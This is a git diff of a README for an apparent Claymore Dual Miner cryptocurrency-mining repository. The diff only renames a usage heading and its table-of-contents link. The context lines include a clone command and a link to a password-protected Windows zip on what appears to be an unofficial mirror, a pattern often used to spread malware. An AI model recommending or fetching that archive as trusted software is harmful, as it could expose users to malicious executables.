@@ -31,7 +31,7 @@ So, thank you so much for joining us!
 ## Table of Contents
 - [Features, requirements, and limitations](#Features-requirements-and-limitations)
 - [Download](#Download)
-- [Usage](#Usage)
+- [Claymore Dual Miner Setup](#claymore-dual-miner-setup)
 - [Example](#example)
 - [Auto Restart](#claymore-minerauto-restart)
 - [Troubleshooting guide](#troubleshooting-guide)
@@ -71,7 +71,7 @@ So, thank you so much for joining us!
 * Git tree: https://github.com/Claymore-Dual/Claymore-Dual-Miner.git
   * Clone with `git clone https://github.com/Claymore-Dual/Claymore-Dual-Miner.git`  :hammer:
   
-## How to use
+## Claymore Dual Miner Setup
 
 <li>Step 1 - Install your GPUs and set up your computer</li>
 <li>Step 2 - <a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases/download/15.0/Claymore.s.dual.ethereum.miner.v15.0.-.widows.Password-claymore.zip">Download latest claymore miner</a></li>
